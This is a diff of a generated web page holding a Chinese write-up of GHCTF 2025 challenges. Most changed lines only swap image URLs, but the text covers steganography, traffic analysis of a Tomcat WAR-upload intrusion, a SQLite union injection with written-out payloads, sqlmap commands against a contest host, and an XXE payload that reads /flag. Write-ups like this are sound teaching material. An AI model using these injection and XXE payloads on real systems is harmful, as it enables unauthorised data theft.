+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/2.jpg&#34;
 	width=&#34;1954&#34;
 	height=&#34;717&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/2_hu14208637472325308040.jpg 480w, http://localhost:58266/p/ghctf2025/2_hu11020676247546425778.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/2_hu14208637472325308040.jpg 480w, http://localhost:1313/p/ghctf2025/2_hu11020676247546425778.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;2&#34;
@@ -3257,10 +3257,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​		再根据邮箱搜索，可以加入邮箱群，但是需要密码，这里密码就是之前爆出来的密码（在github的issue里有提示），然后就得到了认证码。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/3.jpg&#34;
 	width=&#34;1642&#34;
 	height=&#34;307&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/3_hu5417907215706706894.jpg 480w, http://localhost:58266/p/ghctf2025/3_hu9349163194141406179.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/3_hu5417907215706706894.jpg 480w, http://localhost:1313/p/ghctf2025/3_hu9349163194141406179.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;3&#34;
@@ -3276,10 +3276,10 @@
 &lt;/h3&gt;&lt;p&gt;​		额，ai题，直接交给ai处理了。是一道算法题，这里不多赘述&lt;/p&gt;
 &lt;h3 id=&#34;四mypixel&#34;&gt;四、mypixel
 &lt;/h3&gt;&lt;p&gt;​		附件一个png，是一个像素，拖进随波逐流里之后并没有什么有用的信息，提示说时像素，想到lsb隐写，去stegsolve看看&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323155025947.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323155025947.png&#34;
 	width=&#34;63&#34;
 	height=&#34;50&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323155025947_hu12623617155040441724.png 480w, http://localhost:58266/p/ghctf2025/image-20250323155025947_hu15772557271411377583.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323155025947_hu12623617155040441724.png 480w, http://localhost:1313/p/ghctf2025/image-20250323155025947_hu15772557271411377583.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-2025032315502594&#34;
@@ -3290,10 +3290,10 @@
 		data-flex-basis=&#34;302px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323154208098.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323154208098.png&#34;
 	width=&#34;1083&#34;
 	height=&#34;840&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323154208098_hu17053180329481820010.png 480w, http://localhost:58266/p/ghctf2025/image-20250323154208098_hu981427716271671549.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323154208098_hu17053180329481820010.png 480w, http://localhost:1313/p/ghctf2025/image-20250323154208098_hu981427716271671549.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250323154208098&#34;
@@ -3306,10 +3306,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​		做题的时候没想到要全选，这里明显是压缩包，提取一下&lt;/p&gt;
 &lt;p&gt;​		打开又是一个像素png&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323155009278.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323155009278.png&#34;
 	width=&#34;1154&#34;
 	height=&#34;743&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323155009278_hu15130349420601150209.png 480w, http://localhost:58266/p/ghctf2025/image-20250323155009278_hu3269227837057510827.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323155009278_hu15130349420601150209.png 480w, http://localhost:1313/p/ghctf2025/image-20250323155009278_hu3269227837057510827.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250323155009278&#34;
@@ -3325,10 +3325,10 @@
 &lt;/h3&gt;&lt;p&gt;​		流量分析&lt;/p&gt;
 &lt;p&gt;​	&lt;strong&gt;问题1：请问被害者主机开放了哪些端口？提交的答案从小到大排序并用逗号隔开&lt;/strong&gt;Q1：&lt;/p&gt;
 &lt;p&gt;​		文件里几乎都是请求，和404，这里初步判断是在dirsearch，题目要求找到被害者主机开发的端口，被害主机肯定就是http回应的主机，也就是192.168.252.136。在tcp处可以看到8080-&amp;gt;50656的字样，可以推断处8080是端口之一。其他的端口也可以通过这种方式找到，但是无疑是大海捞针。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250323183757025.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250323183757025.png&#34;
 	width=&#34;1165&#34;
 	height=&#34;538&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250323183757025_hu15035841438057846322.png 480w, http://localhost:58266/p/ghctf2025/image-20250323183757025_hu14290493215221421459.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250323183757025_hu15035841438057846322.png 480w, http://localhost:1313/p/ghctf2025/image-20250323183757025_hu14290493215221421459.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250323183757025&#34;
@@ -3360,10 +3360,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp.flags.syn == 0
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250324210331262.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250324210331262.png&#34;
 	width=&#34;1637&#34;
 	height=&#34;254&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250324210331262_hu14689066144105066643.png 480w, http://localhost:58266/p/ghctf2025/image-20250324210331262_hu9843044025766762745.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250324210331262_hu14689066144105066643.png 480w, http://localhost:1313/p/ghctf2025/image-20250324210331262_hu9843044025766762745.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250324210331262&#34;
@@ -3377,10 +3377,10 @@
 &lt;p&gt;​		得到端口号 22 3306 8080&lt;/p&gt;
 &lt;p&gt;​	&lt;strong&gt;问题2：mrl64喜欢把数据库密码放到桌面上，这下被攻击者发现了，数据库的密码是什么呢？&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;​		既然是爆破，我们找到爆破成功的位置&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250324213040493.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250324213040493.png&#34;
 	width=&#34;1659&#34;
 	height=&#34;583&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250324213040493_hu11045561210233564917.png 480w, http://localhost:58266/p/ghctf2025/image-20250324213040493_hu9336781827273072614.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250324213040493_hu11045561210233564917.png 480w, http://localhost:1313/p/ghctf2025/image-20250324213040493_hu9336781827273072614.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250324213040493&#34;
@@ -3394,10 +3394,10 @@
 &lt;p&gt;​&lt;/p&gt;
 &lt;p&gt;​		之后肯定是一些注入，我自己分析不出来，直接看wp了。&lt;/p&gt;
 &lt;p&gt;​		wp说扫描之后，登录了tomcat&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325104000603.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325104000603.png&#34;
 	width=&#34;1407&#34;
 	height=&#34;73&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325104000603_hu3350708607269077708.png 480w, http://localhost:58266/p/ghctf2025/image-20250325104000603_hu1257424582276948531.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325104000603_hu3350708607269077708.png 480w, http://localhost:1313/p/ghctf2025/image-20250325104000603_hu1257424582276948531.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325104000603&#34;
@@ -3410,10 +3410,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​&lt;/p&gt;
 &lt;p&gt;​		不过我不知道什么是tomcat，这里搜一下贴一个解释&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325104226521.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325104226521.png&#34;
 	width=&#34;1462&#34;
 	height=&#34;234&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325104226521_hu5026552264360910889.png 480w, http://localhost:58266/p/ghctf2025/image-20250325104226521_hu14010801252462006880.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325104226521_hu5026552264360910889.png 480w, http://localhost:1313/p/ghctf2025/image-20250325104226521_hu14010801252462006880.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325104226521&#34;
@@ -3426,10 +3426,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​		然后上传了一个恶意war包，接着进行通信&lt;/p&gt;
 &lt;p&gt;​		找一下waf包可以发现以下包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325103136322.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325103136322.png&#34;
 	width=&#34;1116&#34;
 	height=&#34;946&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325103136322_hu154405479813781132.png 480w, http://localhost:58266/p/ghctf2025/image-20250325103136322_hu18170119774406305055.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325103136322_hu154405479813781132.png 480w, http://localhost:1313/p/ghctf2025/image-20250325103136322_hu18170119774406305055.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325103136322&#34;
@@ -3441,10 +3441,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​		把这个文件下载下来，用bandizip打开&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326085750032.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326085750032.png&#34;
 	width=&#34;1125&#34;
 	height=&#34;780&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326085750032_hu10593961763054534531.png 480w, http://localhost:58266/p/ghctf2025/image-20250326085750032_hu8025442227355900734.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326085750032_hu10593961763054534531.png 480w, http://localhost:1313/p/ghctf2025/image-20250326085750032_hu8025442227355900734.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326085750032&#34;
@@ -3456,10 +3456,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​			可以得到这个，然后又卡住了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326085955724.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326085955724.png&#34;
 	width=&#34;1036&#34;
 	height=&#34;149&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326085955724_hu5437445683512844358.png 480w, http://localhost:58266/p/ghctf2025/image-20250326085955724_hu4377368471685314457.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326085955724_hu5437445683512844358.png 480w, http://localhost:1313/p/ghctf2025/image-20250326085955724_hu4377368471685314457.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326085955724&#34;
@@ -3472,10 +3472,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​	&lt;strong&gt;问题3：攻击者在数据库中找到了一个重要的数据，这个重要数据是什么？&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;​		流量分析中有关于mysql的流量，进入数据流中就能找到重要的数据&lt;/p&gt;
-&lt;p&gt;​		&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325184006463.png&#34;
+&lt;p&gt;​		&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325184006463.png&#34;
 	width=&#34;1070&#34;
 	height=&#34;255&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325184006463_hu12031106339969435469.png 480w, http://localhost:58266/p/ghctf2025/image-20250325184006463_hu8231992307929240822.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325184006463_hu12031106339969435469.png 480w, http://localhost:1313/p/ghctf2025/image-20250325184006463_hu8231992307929240822.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325184006463&#34;
@@ -3493,10 +3493,10 @@
 &lt;h3 id=&#34;sql&#34;&gt;SQL???
 &lt;/h3&gt;&lt;h4 id=&#34;知识点sqlite注入sqlmap的使用&#34;&gt;知识点：sqlite注入、sqlmap的使用
 &lt;/h4&gt;&lt;p&gt;​			注入点很明显是get方式的id&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325192545763.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325192545763.png&#34;
 	width=&#34;1765&#34;
 	height=&#34;1018&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325192545763_hu17796110117607030939.png 480w, http://localhost:58266/p/ghctf2025/image-20250325192545763_hu11913906212414122168.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325192545763_hu17796110117607030939.png 480w, http://localhost:1313/p/ghctf2025/image-20250325192545763_hu11913906212414122168.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3514,10 +3514,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 order by 6
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325194749832.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325194749832.png&#34;
 	width=&#34;1627&#34;
 	height=&#34;544&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325194749832_hu8206549837795494430.png 480w, http://localhost:58266/p/ghctf2025/image-20250325194749832_hu10743764762520930485.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325194749832_hu8206549837795494430.png 480w, http://localhost:1313/p/ghctf2025/image-20250325194749832_hu10743764762520930485.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325194749832&#34;
@@ -3528,10 +3528,10 @@
 		data-flex-basis=&#34;717px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325195215827.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325195215827.png&#34;
 	width=&#34;1699&#34;
 	height=&#34;481&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325195215827_hu17502111437370734467.png 480w, http://localhost:58266/p/ghctf2025/image-20250325195215827_hu16025130950787479539.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325195215827_hu17502111437370734467.png 480w, http://localhost:1313/p/ghctf2025/image-20250325195215827_hu16025130950787479539.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325195215827&#34;
@@ -3544,10 +3544,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​			发现到六就会爆错，那么字段数应该是5了&lt;/p&gt;
 &lt;p&gt;​			本来先查库的，但是database()会爆错，试用sqlite_version()发现是sqlite。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325203954443.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325203954443.png&#34;
 	width=&#34;1518&#34;
 	height=&#34;807&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325203954443_hu8679953877720153389.png 480w, http://localhost:58266/p/ghctf2025/image-20250325203954443_hu12931628346044584910.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325203954443_hu8679953877720153389.png 480w, http://localhost:1313/p/ghctf2025/image-20250325203954443_hu12931628346044584910.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325203954443&#34;
@@ -3575,10 +3575,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=1 union select 1,2,3,4,(select sql from sqlite_master)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325210028299.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325210028299.png&#34;
 	width=&#34;1545&#34;
 	height=&#34;857&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325210028299_hu4953605395079659160.png 480w, http://localhost:58266/p/ghctf2025/image-20250325210028299_hu4699644634841563890.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325210028299_hu4953605395079659160.png 480w, http://localhost:1313/p/ghctf2025/image-20250325210028299_hu4699644634841563890.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325210028299&#34;
@@ -3607,10 +3607,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=1 union select 1,2,3,4,(select group_concat(flag) from flag)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325210639348.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325210639348.png&#34;
 	width=&#34;1513&#34;
 	height=&#34;534&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325210639348_hu11373603192224397864.png 480w, http://localhost:58266/p/ghctf2025/image-20250325210639348_hu5379233684091297276.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325210639348_hu11373603192224397864.png 480w, http://localhost:1313/p/ghctf2025/image-20250325210639348_hu5379233684091297276.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325210639348&#34;
@@ -3639,10 +3639,10 @@
 &lt;p&gt;​			&amp;ndash;technique=B：-B指定布尔盲注的形式，- T指定时间盲注。（不写也行）&lt;/p&gt;
 &lt;p&gt;​			&amp;ndash;dbs：获取数据库名字。&lt;/p&gt;
 &lt;p&gt;​			这里已经发现是sqlite了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325215439070.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325215439070.png&#34;
 	width=&#34;1104&#34;
 	height=&#34;540&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325215439070_hu15344108437727660264.png 480w, http://localhost:58266/p/ghctf2025/image-20250325215439070_hu8128672437645105376.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325215439070_hu15344108437727660264.png 480w, http://localhost:1313/p/ghctf2025/image-20250325215439070_hu8128672437645105376.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325215439070&#34;
@@ -3654,10 +3654,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​			然后也是成功检测到了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325215604964.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325215604964.png&#34;
 	width=&#34;1257&#34;
 	height=&#34;535&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325215604964_hu16964510700570198390.png 480w, http://localhost:58266/p/ghctf2025/image-20250325215604964_hu8876034174905695081.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325215604964_hu16964510700570198390.png 480w, http://localhost:1313/p/ghctf2025/image-20250325215604964_hu8876034174905695081.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325215604964&#34;
@@ -3678,10 +3678,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​			查到表&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325220728388.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325220728388.png&#34;
 	width=&#34;1085&#34;
 	height=&#34;497&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325220728388_hu6303008933902990501.png 480w, http://localhost:58266/p/ghctf2025/image-20250325220728388_hu17245237686393130349.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325220728388_hu6303008933902990501.png 480w, http://localhost:1313/p/ghctf2025/image-20250325220728388_hu17245237686393130349.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325220728388&#34;
@@ -3709,10 +3709,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://node1.anna.nssctf.cn:28106/?id=1&amp;#34;&lt;/span&gt; -p id --random-agent --fresh-queries --no-cast --technique&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;B -T flag --columns 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325221238445.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325221238445.png&#34;
 	width=&#34;709&#34;
 	height=&#34;342&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325221238445_hu14246113560869095280.png 480w, http://localhost:58266/p/ghctf2025/image-20250325221238445_hu6341521431644075599.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325221238445_hu14246113560869095280.png 480w, http://localhost:1313/p/ghctf2025/image-20250325221238445_hu6341521431644075599.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250325221238445&#34;
@@ -3740,10 +3740,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://node1.anna.nssctf.cn:28106/?id=1&amp;#34;&lt;/span&gt; -p id --random-agent --fresh-queries --no-cast --technique&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;B -T flag -C flag --dump
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250325221654884.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250325221654884.png&#34;
 	width=&#34;952&#34;
 	height=&#34;425&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250325221654884_hu13004093688832547131.png 480w, http://localhost:58266/p/ghctf2025/image-20250325221654884_hu10330567981871895865.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250325221654884_hu13004093688832547131.png 480w, http://localhost:1313/p/ghctf2025/image-20250325221654884_hu10330567981871895865.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3785,10 +3785,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE creds[&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt;&lt;/span&gt;]&amp;gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;creds&amp;gt;&amp;lt;name&amp;gt;&lt;/span&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/name&amp;gt;&amp;lt;/creds&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326105929283.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326105929283.png&#34;
 	width=&#34;1403&#34;
 	height=&#34;571&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326105929283_hu11661928255016552275.png 480w, http://localhost:58266/p/ghctf2025/image-20250326105929283_hu5231848046138869546.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326105929283_hu11661928255016552275.png 480w, http://localhost:1313/p/ghctf2025/image-20250326105929283_hu5231848046138869546.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326105929283&#34;
@@ -3834,10 +3834,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326110043406.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326110043406.png&#34;
 	width=&#34;799&#34;
 	height=&#34;795&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326110043406_hu4390965845695209336.png 480w, http://localhost:58266/p/ghctf2025/image-20250326110043406_hu2201971898095949178.png 1024w&#34;
